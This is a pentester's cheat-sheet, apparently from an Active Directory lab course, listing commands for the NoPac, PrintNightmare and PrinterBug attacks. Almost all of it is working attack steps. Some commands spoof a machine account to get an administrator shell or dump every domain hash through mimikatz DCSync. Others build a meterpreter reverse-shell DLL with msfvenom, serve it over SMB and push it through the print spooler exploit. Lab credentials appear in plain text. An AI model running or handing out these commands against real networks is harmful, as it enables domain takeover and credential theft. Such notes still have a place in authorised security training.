# NoPac (SamAccountName Spoofing)
Reading: https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware
```
git clone https://github.com/Ridter/noPac.git
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap 
```
(If you can get a TGT with a normal user and ms-DS-MachineAccountQuota>0 then it's vulnerable) 
```
└──╼ #sudo python3 scanner.py inlanefreight.local/CT059: -dc-ip 172.16.7.3  -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
Password:
[*] No credentials supplied, supply password
Password:
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.7.3. Ticket size 1506
[*] Got TGT from DC01.INLANEFREIGHT.LOCAL. Ticket size 749

```

```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
(This will get you a shell)

## Windows variant
https://github.com/ricardojba/Invoke-noPac
https://github.com/cube0x0/noPac

`noPac.exe scan -domain domain.local -user "lowpriv" -pass "lowpriv"` (If you get to Download TGT then it will work)
```
noPac.exe -domain mcafeelab.local -user "lowpriv" -pass "lowpriv" /dc HOSTNAMEDC /mAccount yovecio /mPassword yovecio /service ldaps /ptt /impersonate Administrator
```
(mimikatz) `lsadump::dcsync /domain:mcafeelab.local /all`


# PrintNightmare
```
git clone https://github.com/cube0x0/CVE-2021-1675.git
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```
(This confirm that printspooler is active)
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```
(Creates the revshell)
```
sudo smbserver.py -smb2support CompData /path/to/exploit/folder/
```
(Serve the SMB share, remember to give as path to the Folder containing the DLL and not the file as well otherwise the script won't work)
```
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
(exploit time)
OBS: You might have to use this impacket if you get strange errors
```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```
(Guide: https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare#practice)


# PrinterBUG 
You could use https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn
To sniff the hash with responder.
